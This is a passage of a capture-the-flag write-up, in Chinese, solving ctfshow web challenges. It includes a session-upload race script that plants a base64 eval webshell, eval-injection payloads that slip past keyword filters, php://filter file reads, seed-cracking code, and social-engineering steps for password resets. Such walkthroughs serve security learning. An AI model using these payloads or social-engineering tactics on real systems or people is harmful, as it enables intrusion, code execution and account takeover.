class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=mb&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">        <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                                   <span class="comment">#上传无效的空文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27;</span>     <span class="comment">#恶意进度信息，readfile将直接输出文件内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url,files=files,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="comment"># event.wait()</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        POST()</span><br><span class="line">        t=r.get(<span class="string">&quot;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/?file=/tmp/sess_mb&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">&#x27;[+] success&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><p>或者包含日志:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</span><br></pre></td></tr></table></figure><p>先包含日志配置文件查看log文件位置，只需在user-agent中加入一句话就行</p><h2 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h2><h3 id="web11-1"><a href="#web11-1" class="headerlink" title="web11"></a>web11</h3><p>提示域名也可以隐藏信息，立马想到了txt记录，直接<code>nslookup</code></p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200906224511.png"></p><h3 id="web12-1"><a href="#web12-1" class="headerlink" title="web12"></a>web12</h3><p>提示页面中的信息是密码，发现有个手机号，密码刚好为这</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:372619038</span><br></pre></td></tr></table></figure><h3 id="web13-1"><a href="#web13-1" class="headerlink" title="web13"></a>web13</h3><p>查看源码发现<code>document.pdf</code>，下载下来找到后台为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;system1103&#x2F;login.php</span><br><span class="line">默认账号密码：admin:admin1103</span><br></pre></td></tr></table></figure><h3 id="web14-1"><a href="#web14-1" class="headerlink" title="web14"></a>web14</h3><p>查看源码发现<code>/editor/</code>路径，访问查看源码发现是KindEditor，直接在文件空间找到flag的路径为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;nothinghere&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>社工题，首页暴露的邮箱搜了下qq发现居住陕西西安，<code>/admin</code>成功通过密保问题重置密码</p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>提示探针，访问<code>tz.php</code>，在phpinfo中找到flag</p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>网络空间搜索引擎就行，zoomeye直接查</p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>查看源代码，发现js中有谐音</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你赢了，去幺幺零点皮爱吃皮看看</span><br></pre></td></tr></table></figure><p>访问<code>110.php</code>得到flag</p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>查看源码发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag=<span class="string">&quot;fakeflag&quot;</span>;</span><br><span class="line">$u = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$p = $_POST[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($u) &amp;&amp; <span class="keyword">isset</span>($p))&#123;</span><br><span class="line">    <span class="keyword">if</span>($u===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $p ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且发现加密方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="string">&quot;0000000372619038&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> iv = <span class="string">&quot;ilove36dverymuch&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> pazzword = $(<span class="string">&quot;#pazzword&quot;</span>).val();</span><br><span class="line">        pazzword = encrypt(pazzword,key,iv);</span><br><span class="line">        $(<span class="string">&quot;#pazzword&quot;</span>).val(pazzword);</span><br><span class="line">        $(<span class="string">&quot;#loginForm&quot;</span>).submit();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">data,key,iv</span>) </span>&#123; <span class="comment">//key,iv：16位的字符串</span></span><br><span class="line">        <span class="keyword">var</span> key1  = CryptoJS.enc.Latin1.parse(key);</span><br><span class="line">        <span class="keyword">var</span> iv1   = CryptoJS.enc.Latin1.parse(iv);</span><br><span class="line">        <span class="keyword">return</span> CryptoJS.AES.encrypt(data, key1,&#123;</span><br><span class="line">            iv : iv1,</span><br><span class="line">            mode : CryptoJS.mode.CBC,</span><br><span class="line">            padding : CryptoJS.pad.ZeroPadding</span><br><span class="line">        &#125;).toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>aes加密，直接用<code>CyberChef</code>解，后面的点是多余的，即密码为<code>i_want_a_36d_girl</code></p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200907115829.png"></p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>御剑扫目录发现有<code>/db</code>，手测<code>/db/db.mdb</code>存在，下载下来，16进制编辑器打开，搜索flag</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200907122023.png"></p><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>给的有子典，抓包，发现经过了一层base64加密，没事，burpsuite可以解决</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200907122700.png"></p><p>好像不能url编码，最终跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:shark63</span><br></pre></td></tr></table></figure><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>子域名爆破，盲猜<code>flag.ctfer.com</code></p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>爆破，可以知道，第2位，第15位，第18位是一样的，并且为数字，第32位为3，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000000000000000</span>):</span><br><span class="line">    s = hashlib.md5(str(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">1</span>]==s[<span class="number">14</span>] <span class="keyword">and</span> s[<span class="number">14</span>]==s[<span class="number">17</span>] <span class="keyword">and</span> s[<span class="number">31</span>].isdigit() <span class="keyword">and</span> s[<span class="number">31</span>]==<span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        print(i,s)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪随机数，版本是php7</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="comment">// 1155388967</span></span><br></pre></td></tr></table></figure><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!$rand))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接php_mt_seed爆破种子，直接爆破的话需要<code>36*36*36</code>次，上万了，不太现实，注意<code>mt_rand()</code>的次数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">117235642</span>);</span><br><span class="line">mt_rand();</span><br><span class="line"><span class="keyword">echo</span> (mt_rand()+mt_rand());</span><br></pre></td></tr></table></figure><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>就爆破完事了，密码：<code>7758521</code></p><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>录取名单下载下来<code>list.xlsx</code>，里面有学生的信息，搜了下名字，找到：<a href="https://tools.aizhan.com/rb/idcard.ifanyi.com.cn">https://tools.aizhan.com/rb/idcard.ifanyi.com.cn</a></p><p>其实爆破也行，缺失的部分是人的生日</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://3a5c5c7a-84c9-485d-8a71-822803a153ff.chall.ctf.show/info/checkdb.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;姓名&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;p&quot;</span> <span class="attr">name</span>=<span class="string">&quot;p&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;身份证号码&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>登陆成功给了学号和默认密码，登陆就有flag</p><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;system(&#39;cat *&#39;);</span><br></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;&#39;sys&#39;.&#39;tem&#39;;$a(&#39;cat *&#39;);</span><br></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$a&#x3D;str_replace(&quot;a&quot;,&quot;&quot;,&quot;sysatem&quot;);$a(&quot;head%09-n%09100%09*&quot;);</span><br></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&quot;$_GET[1]&quot;?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;include&#x2F;**&#x2F;$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span 